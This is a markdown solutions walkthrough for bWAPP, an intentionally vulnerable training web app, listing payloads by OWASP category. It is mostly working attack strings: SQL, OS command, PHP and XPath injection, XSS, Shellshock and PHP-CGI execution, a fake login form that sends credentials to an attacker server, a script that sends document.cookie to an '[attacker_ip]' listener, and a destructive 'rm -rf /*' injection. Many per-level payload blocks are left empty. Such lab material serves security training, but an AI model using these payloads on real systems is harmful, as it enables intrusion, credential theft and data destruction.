# bWAPP 🐝 Solutions - [an extremely buggy web app !](https://bwapp.hakhub.net)
---
# / A1 - Injection /

## 💀  HTML Injection - Reflected (GET) 💀

url: /htmli_get.php

### Security level: low

Any HTML tags will work. (`<b></b>`, `<u></u>`, `<p></p>`, `<h></h>`)

Payload:
```
First name: <h>asdf</h>
Last name: <u>asdf</u>
```

### Security level: medium

Payload should be encoded into url:
 - `<u>asdf</u>` --> `%3c%75%3e%61%73%64%66%3c%2f%75%3e`
 - `<u>asdf</u>` --> `%3c%75%3easdf%3c%2f%75%3e`

Payload: 
```
First name: %3c%75%3e%61%73%64%66%3c%2f%75%3e
Last name: %3c%75%3easdf%3c%2f%75%3e
```

### Security level: high

Payload: 
```
```

get's input with GET request and shows in the webpage with out validation in filtering

```
/bWAPP/htmli_get.php?firstname=%3Ch1%3EHello%3C%2Fh1%3E&lastname=%3Ch2%3EWorld%3C%2Fh2%3E&form=submit
```

or

```
first name : <h1>Hello</h1>
last name : <h1><b>World</b></h1>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  HTML Injection - Reflected (POST) 💀

url: /htmli_post.php

get's input from the input fields in sends POST request to the current webpage and displays with out validation and filtering, you can write html you want mr hacker :)

```
<h1>Hello</h1>
<h2><i>World</i></h2>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  HTML Injection - Reflected (URL) 💀

url: htmli_current_url.php
just shows the current uri with filters, con't pass get request

use burp suite for inject html or script using the url
```
htmli_current_url.php?>h1>Hacker loi</h1>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  HTML Injection - Stored (Blog) 💀

url: /htmli_stored.php
this one is pretty scarry. in the given fields any html you wite will be stored in the database then dispalyed in the bellow table.

try the following and analayse the result

```
<form method="post" action="http://127.0.0.1:8888/hacker_login_form.php">
       <div class="form-group">
           <label for="username">username</label>
           <input id="username" class="form-control" type="text" name="username">
       </div>
       <div class="form-group">
           <label for="password">password</label>
           <input id="password" class="form-control" type="password" name="password">
       </div>
       <button>Submit</button>
   </form>
```

and make sure to create hacker_login_form.php file wich will include the following code just for showing the credentails.

```
if(isset($_POST['username'])){
    var_dump($_POST['username'])
    var_dump($_POST['password'])
}
```
and to start the php server at http://127.0.0.1:8888 execute the following commond in the that folder (where you created that php file)
```
php -S 127.0.0.1:8888
```
once some one submits that login form the POST request will be send to the attacker server

Attacker's machine:

```
nc -l 80
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  iFrame Injection 💀
execute javascript by appending at in the uri
```
1. " onload="alert('hacked')
```
show prompt alert
```
2. "></iframe><script>prompt("Hi, why you are hacking this!");</script>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  OS Command Injection 💀
url: /
append more than one commands . at executes nslookup command on the given DNS so we can append more command and take advantage of.
```
www.nsa.gov; cat /etc/passwd
```
```
www.nsa.gov & cat /etc/passwd
```
```
www.nsa.gov | cat /etc/passwd
```
```
www.nsa.gov | mkdir GameOver
```
⛔ execute this command at your own risk ⛔
```
www.nsa.gov && rm -rf /*
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  OS Command Injection - Blind 💀
url: /commandi_blind.php

bind more shell commands 
```
www.nsa.gov | sleep 10
```



### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  PHP Code Injection 💀
url: /phpi.php
pass or append bad php code with message variable. the following code will list the content of /etc/passed directory.
```
phpi.php?message='a';echo "what"; $fp = fopen("/etc/passwd","r");$result = fread($fp,8192); echo $result
```
the following shows the current directory path
```
phpi.php?message='hacker loi '; echo __dir__;
```
show cookies
```
phpi.php?message='whatever ';var_dump($_COOKIE)
```
show sessions
```
phpi.php?message='whatever ';var_dump($_SESSION)
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Server-Side Includes: 💀
url: /ssii.php
```
<!--#echo var="DATE_LOCAL" -->
<!--#exec cmd="cat /etc/passwd" -->
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (GET/SEARCH) 💀

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--

```
show databases tables using union
```
sqli_1.php?title=man%%27%20UNION%20ALL%20SELECT%20table_schema,table_name,%20null,%20null,%20null,%20null,%20null%20from%20information_schema.tables;--%20sXHO&action=search
```
others query identied using sqlmap
```
Type: boolean-based blind
    Title: AND boolean-based blind - WHERE or HAVING clause
    Payload: title=man%' AND 7892=7892 AND '%'='&action=search

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (query SLEEP)
    Payload: title=man%' OR (SELECT * FROM (SELECT(SLEEP(5)))sqDX) AND '%'='&action=search

    Type: UNION query
    Title: Generic UNION query (NULL) - 7 columns
    Payload: title=man%' UNION ALL SELECT NULL,CONCAT(0x7171707671,0x586d66766176616a7345674b664f704764757a6e487558414c71786250466d566245655a7457596a,0x7176787a71),NULL,NULL,NULL,NULL,NULL-- sXHO&action=search

```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (GET/SELECT) 💀
url: /sqli_2.php
another basic type of SQL inject with GET request. 

show specific field name. and exploere more by changing the limit and offset values.
```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
or

```
sqli_2.php?movie=1%20UNION%20ALL%20SELECT%20table_schema%2ctable_name%2c%20null%2c%20null%2c%20null%2c%20null%2c%20null%20from%20information_schema.tables%20LIMIT%201%20OFFSET%204%3b--
```

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_1.png)
![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/sqli_2_2.png)


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (POST/Search) 💀

url: /sqli_6.php

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;--
```
or research more using sqlmap execute the following command
```
sqlmap -u "http://127.0.0.1:9000/sqli_6.php" --cookie="PHPS
ESSID=3agpar2ogveldop3d3psvfsfmt; security_level=0" --data "title=test&action=search" -p title –sql-shell

```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (POST/Select) 💀

Use Burp

```
movie=1 UNION ALL SELECT table_schema, table_name, null, null, null, null, null FROM information_schema.tables LIMIT 1 OFFSET 1;--
```
or burp code
```
1%20UNION%20ALL%20SELECT%20table_schema%2c%20table_name%2c%20null%2c%20null%2c%20null%2c%20null%2c%20null%20FROM%20information_schema.tables%20LIMIT%201%20OFFSET%201%3b--
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (AJAX/JSON/jQuery) 💀
url: /sqli_10-2.php

sends get request using ajax
Use Burp

```
a%' UNION ALL SELECT table_schema,table_name, null, null, null, null, null from information_schema.tables;-- "
```
or url incoded 
```
a%25'%20UNION%20ALL%20SELECT%20table_schema%2ctable_name%2c%20null%2c%20null%2c%20null%2c%20null%2c%20null%20from%20information_schema.tables%3b--%20%22
```

```
a%' UNION ALL SELECT 1, column_name, null, null, null, null, null from information_schema.columns where table_name="users";--
```
```
blah%' union all select 1,login,password,email,secret,1, 1 from users --
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (Login Form/Hero) 💀
useing burp
```
ok' or 1=1--
```
```
login=ok' or 1=1-- "&password=ok' or 1=1--  
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection (Login Form/User) 💀
```
ok' or 1=1-- "
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection(SQLite) 💀

```
a%' UNION ALL SELECT 1,sqlite_version(),1,1,1,1; --
```
or
```
%' UNION ALL select * from users where id=1; -- "
```
or
```
login=lol%' UNION ALL select * from users -- "&password=bug&
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  QL Injection - Stored (XML) 💀
use burp
```
<reset><login>bee%' OR SLEEP(5)#</login><secret>lol</secret></reset>
```
sqlmap identified the following injection point(s) with a total of 511 HTTP(s) requests:
```
Parameter: XML (generic) login ((custom) POST)
    Type: boolean-based blind
    Title: MySQL RLIKE boolean-based blind - WHERE, HAVING, ORDER BY or GROUP BY clause
    Payload: <reset><login>bee%' RLIKE (SELECT (CASE WHEN (7674=7674) THEN 0x626565 ELSE 0x28 END)) AND '%'='</login><secret>lol</secret></reset>

    Type: error-based
    Title: MySQL >= 5.1 AND error-based - WHERE, HAVING, ORDER BY or GROUP BY clause (EXTRACTVALUE)
    Payload: <reset><login>bee%' AND EXTRACTVALUE(6673,CONCAT(0x5c,0x7170787671,(SELECT (ELT(6673=6673,1))),0x717a6b6271)) AND '%'='</login><secret>lol</secret></reset>

    Type: AND/OR time-based blind
    Title: MySQL >= 5.0.12 OR time-based blind (comment)
    Payload: <reset><login>bee%' OR SLEEP(5)#</login><secret>lol</secret></reset>
---
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection - Blind - Boolean-Based 💀
url /sqli_4.php
```
x' OR '1'='1
```
```
x' OR (select database()='bWAPP') AND '1'='1
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  SQL Injection - Stored (Blog) 💀

Be sure to add a space after the -- for this one, otherwise the injection will not work

```
asdf',(SELECT database()  ))--
```

To begin enumerating tables:

```
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 0,1  ))--
asdf',(SELECT TABLE_NAME FROM information_schema.TABLES WHERE TABLE_SCHEMA = 'bWAPP' LIMIT 1,1  ))--
```

```
asdf',(select password from mysql.user where user='root' ))--
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XML/XPath Injection (Login Form) 💀
using burp

to see the magic just change the id ;)
```
login=bee
password=' or id='2
```
or
```
login=bee&password=password%3d'%20or%20id%3d'2&form=submit
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XML/XPath Injection (Search) 💀


show passwords
```
genre=')]/password | a[contains(a,'
```
show usernames
```
genre=')]/login | a[contains(a,'
```
show secrets
```
genre=%27)]/secret%20|%20a[contains(b,%27
```
show genre field
```
?genre=%27)]/genre%20|%20a[contains(a,%27
```
```
genre=') or not(contains(genre, 'xxx') and '1'='2
```

# / A2 - Broken Authentication /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Broken Auth. - CAPTCHA Bypassing 💀

Using Burp, do not allow the webpage to load captcha_box.php, this page loads the server's session variable $\_SESSION["captcha"] which will then require a check on ba_captcha_bypass.php
The second requirement is to prevent captcha_user from being submitted by the client. Eliminate this using Burp:

```
POST /ba_captcha_bypass.php HTTP/1.1
Host: 127.0.0.1
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Referer: http://127.0.0.1/ba_captcha_bypass.php
Cookie: PHPSESSID=67a6abb1d7ff40c55ad50d3aa43fc7c4; security_level=0
Connection: keep-alive
Content-Type: application/x-www-form-urlencoded
Content-Length: 34

login=bee&password=bug&form=submit
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Broken Auth. - Logout Management 💀

Open second tab and logout. Second tab will still have session.
at just redirects to the login page but does not deletes the session and cookie 
after loggin out you can still use the app with out logging in again and if you check the PHPSESSID at will still exists


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Session Mgmt. - Administrative Portals 💀

set the following in the URL.
easy right ;)
admin is kind of bool variable

from
```
admin=0
```
to
```
admin=1
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Session Mgmt. - Cookies (HTTPOnly) 💀
viewing and writting cookies
you can change the current with these

use burp
```
security_level=0; PHPSESSID=ing4kmubr61dqeskckjb4dfu9h; top_security=yes;hacker_loi=<script>alert('lol')</script>
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Session Mgmt. - Cookies (Secure) 💀
viewing and writting cookies
you can change the current with these

use burp
```
security_level=0; PHPSESSID=ing4kmubr61dqeskckjb4dfu9h; top_security=yes;hacker_loi=<script>alert('another lol ;)')</script>
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Session Mgmt. - Session ID in URL 💀
here you see your PHSESSID cookie in the url
cookie stealing 
```
Session IDs should never be exposed in the URL!
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Broken Auth. - Forgotten Function 💀
this page is for sending or viewing the secret if the user forgot his password.
but here they are showing the secret directly with email compermation. 
try this
```
bwapp-bee@mailinator.com
```
such website users credentails can be hacked just by using there emails to reset there password.



### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Broken Auth. - Insecure Login Forms 💀
login with the credentails given the file . but you cont see at 
directly view source or select text or ctrl+a to see them 
credentails are
```
login: tonystark 
password: I am Iron Man
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Broken Auth. - Weak Passwords 💀
using burp to brutforce the commen weak password and login to the system. this page dont have any sepcial security no time out system you can send millions of requests 
```
hacked using brup intruder and commen list of username/passwords
    
```
### Session Mgmt. - Strong Sessions
show different cookies change security level and visite given link to see the movies :0

# / A3 - Cross-Site Scripting (XSS) /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (GET) 💀

xss_get.php
you can insert html as well as js in the given fields
```
<script>alert(document.cookie)</script>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (POST) 💀
xss_post.php

the same but with POST request

```
<script>alert(document.cookie)</script>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (JSON) 💀

xss_json.php

```
"}]}';prompt(0)</script>

```
```
title="%7D%5D%7D%27%3Bprompt%28"Hi%2C+Enter+Your+Name+Other+wise+your+game+is+ver+%3A0"%29<%2Fscript>&action=search
```

### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (AJAX/JSON) 💀

xss_ajax_2-1.php

```
<svg onload=prompt(0)>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (AJAX/XML) 💀

xss_ajax_1-1.php

```
&lt;img src=&apos;#&apos; onerror=&apos;alert(1)&apos;&gt;
```

Alternatively I was able to get XSS to execute on the AJAX called.

```
xss_ajax_1-2.php?title=<html xmlns='http://www.w3.org/1999/xhtml'><script>prompt(0)</script></html>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (Back Button) 💀

Modify Referer header field

```
Referer: ';alert(1);'
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (Custom Header) 💀

Add header field

```
bWAPP: <script>alert(1)</script>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (Eval) 💀

```
date=alert(1)
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (HREF) 💀

```
Referer: <script>alert(1)</script>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  XSS - Reflected (User-Agent) 💀

```
User-Agent: <script>alert(1)</script>
```

# / A4 - Insecure Direct Object References /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Insecure DOR (Change Secret) 💀

Use Burp to unhide hidden fields or intercept POST param.


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Insecure DOR (Reset Secret) 💀

Change 'login' and 'secret' field to arbitrary values.

```
POST /bWAPP/xxe-2.php HTTP/1.1
Host: bepp:8088
User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10.10; rv:39.0) Gecko/20100101 Firefox/39.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Type: text/xml; charset=UTF-8
Referer: http://bepp:8088/bWAPP/insecure_direct_object_ref_3.php
Content-Length: 59
Cookie: PHPSESSID=77aa634b546d1c78d5afc16aae328172; security_level=0
Connection: keep-alive
Pragma: no-cache
Cache-Control: no-cache

<reset><login>bee</login><secret>Any bugs?</secret></reset>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Insecure DOR (Order Tickets) 💀

bWAPP/insecure_direct_object_ref_2.php

Use Burp to unhide hidden ticket price field, or use proxy to modify the POST param while in transit.

# / A5 - Security Misconfiguration /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Cross-Origin Resource Sharing (AJAX) 💀

It's possible because of header in response:

```
Access-Control-Allow-Origin: *
```

```
<html>
    <head>
    <script>
        function steal() {
            var r = new XMLHttpRequest();
            r.onreadystatechange = function() {
                if (r.readyState == 4 && r.status == 200) {
                    alert(r.responseText);
                }
            };
            r.open("GET", "http://192.168.1.10/bWAPP/secret-cors-1.php", true);
            r.send();
        }
    </script>
    </head>
    <body onload="steal()">
    </body>
</html>
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Cross-Site Tracing (XST) 💀

Doesn't work on modern browsers as there are security enforcements. Maybe use phantomJS?

I modified the POC to use GET instead of TRACE. Additional changes from original xst.js include making the onreadystatechange NOT inline (seems to play better with FF).

1.  Start listener on attacking machine: nc -l 8888

2.  Modify xst.js to match your environment:

```
var xmlhttp;
// Code for IE7+, Firefox, Chrome, Opera, Safari
if (window.XMLHttpRequest)
{
	xmlhttp=new XMLHttpRequest();
}
// Code for IE6, IE5
else
{
	xmlhttp=new ActiveXObject("Microsoft.XMLHTTP");
}

xmlhttp.onreadystatechange=foo;

function foo()
{
	if (xmlhttp.readyState==4 && xmlhttp.status==200)
	{
		xmlResp=xmlhttp.responseText;
		// document.getElementById("response").innerHTML=xmlResp
		alert(xmlResp);
		document.location="http://[attacker_ip]:8888/grab.cgi?"+document.cookie;
	}
}
// xmlhttp.open("TRACE","/bWAPP/",true);
xmlhttp.open("GET","/bWAPP/",true);
// xmlhttp.withCredentials = true;
xmlhttp.send();
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Insecure FTP Configuration 💀

Anonymous login with write permissions are enabled

```
$ ftp 192.168.1.9
Connected to 192.168.1.9.
anonymous
220 ProFTPD 1.3.1 Server (bee-box) [192.168.1.9]
Name (192.168.1.9:dean): 331 Anonymous login ok, send your complete email address as your password
Password:
230 Anonymous access granted, restrictions apply
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> dir
229 Entering Extended Passive Mode (|||42936|)
150 Opening ASCII mode data connection for file list
-rw-rw-r--   1 root     www-data   543803 Nov  2  2014 Iron_Man.pdf
-rw-rw-r--   1 root     www-data   462949 Nov  2  2014 Terminator_Salvation.pdf
-rw-rw-r--   1 root     www-data   544600 Nov  2  2014 The_Amazing_Spider-Man.pdf
-rw-rw-r--   1 root     www-data   526187 Nov  2  2014 The_Cabin_in_the_Woods.pdf
-rw-rw-r--   1 root     www-data   756522 Nov  2  2014 The_Dark_Knight_Rises.pdf
-rw-rw-r--   1 root     www-data   618117 Nov  2  2014 The_Incredible_Hulk.pdf
-rw-rw-r--   1 root     www-data  5010042 Nov  2  2014 bWAPP_intro.pdf
226 Transfer complete
ftp> puts test.txt
?Invalid command.
ftp> put test.txt
local: test.txt remote: test.txt
229 Entering Extended Passive Mode (|||28299|)
150 Opening BINARY mode data connection for test.txt
     0        0.00 KiB/s
226 Transfer complete
ftp> ^D
221 Goodbye.
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Insecure SNMP Configuration 💀

Default community strings are set on the machine

```
$ snmpwalk -v2c -c private bwapp-server
$ snmpwalk -v2c -c public bwapp-server
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Insecure WebDAV Configuration 💀

```
curl -X PUT --data '<?php $f=fopen("/etc/passwd","r"); echo fread($f,filesize("/etc/passwd")); fclose($f); ?>' 'http://192.168.1.10/webdav/attack.php'
```

# / A6 - Sensitive Data Exposure /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Base64 Encoding (Secret) 💀

Use Burp to get cookie

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/insecure_crypt_storage_3.png)


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Heartbleed Vulnerability 💀

Use the heartbleed.py script found in the /evil directory

```
python heartbleed.py [ip]
```

# / A7 - Missing Functional Level Access Control /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Directory Traversal - Directories 💀

directory_traversal_2.php

```
/bWAPP/directory_traversal_2.php?directory=../../../../home/
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Directory Traversal - Files 💀

directory_traversal_1.php

```
/bWAPP/directory_traversal_1.php?page=../../../../../etc/passwd
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Host Header Attack (Cache Poisoning) 💀

hostheader_1.php

![](https://github.com/skiptomyliu/solutions-bwapp/blob/master/screenshots/hostheader_1_1.png)


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Host Header Attack (Reset Poisoning) 💀

hostheader_2.php

![]()


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Remote & Local File Inclusion (RFI/LFI) 💀

Copy rfi.txt to rfi.php, it appears PHP automatically adds the suffix .php.

```
bWAPP/rlfi.php?language=../evil/rfi
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Restrict Device Access 💀

Modify request

```
User-Agent: Mozilla/5.0 (Linux; Android 4.0.4; Galaxy Nexus Build/IMM76B) AppleWebKit/535.19 (KHTML, like Gecko) Chrome/18.0.1025.133 Mobile Safari/535.19
```

# / A8 - Cross-Site Request Forgery (CSRF) /

Reference the HTML files in resources directory. You can modify these to auto execute in a hidden iframe as an exercise. If bWAPP had CSRF mitigations (such as utilization of tokens), then the POST requests made from the csrf_x.html files would respond with forbidden.


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Cross-Site Request Forgery (Change Password) 💀

Please reference [csrf_1.html](resources/csrf_1.html). Replace the address within the HTML with your own bWAPP server and run the form to change the password. If CSRF tokens were utilized, then the server should return forbidden.


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Cross-Site Request Forgery (Change Secret) 💀

Please references [csrf_2.html](resources/csrf_2.html). Again, replace the address within the HTML with your own bWAPP server to change the secret.


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Cross-Site Request Forgery (Transfer Amount) 💀

Please references [csrf_3.html](resources/csrf_3.html). Again, replace the address within the HTML with your own bWAPP server to change the secret.

# / A9 - Using Known Vulnerable Components /


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  PHP CGI Remote Code Execution 💀

```
POST /bWAPP/admin/phpinfo.php?-d+allow_url_include%3d1+-d+auto_prepend_file%3dphp://input HTTP/1.1
Host: 192.168.1.20
User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:45.0) Gecko/20100101 Firefox/45.0
Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
Accept-Language: en-US,en;q=0.5
Accept-Encoding: gzip, deflate
Content-Length: 70
Cookie: security_level=0; PHPSESSID=e27e4148fbb0b82028e1cd6e159f4e7a
Connection: close

<?php $r; exec('cat /etc/passwd', $r); echo implode($r, "\n"); die; ?>
```

There is also possibility to display source code

```
http://192.168.1.20/bWAPP/admin/phpinfo.php?-s
```


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  Shellshock Vulnerability (CGI) 💀

Modify /bWAPP/cgi-bin/shellshock.sh request

```
Referer: () { nothing;}; /bin/touch /tmp/malicious
```

```
Referer: () { nothing;}; echo; /bin/cat /etc/passwd
```

# Other bugs...


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  HTTP Paramter Pollution 💀

Put name

```
bee&movie=1
```

then every link will choose G.I Joe: Retaliation movie.


### Security level: low

Payload: 
```
``` 
### Security level: medium

Payload: 
```
``` 
### Security level: high

Payload: 
```
``` 

## 💀  HTTP Response Splitting 💀

```
http://192.168.1.20/bWAPP/http_response_splitting.php?url=http://itsecgames.blogspot.com%0AReferer%3agoogle.com
```
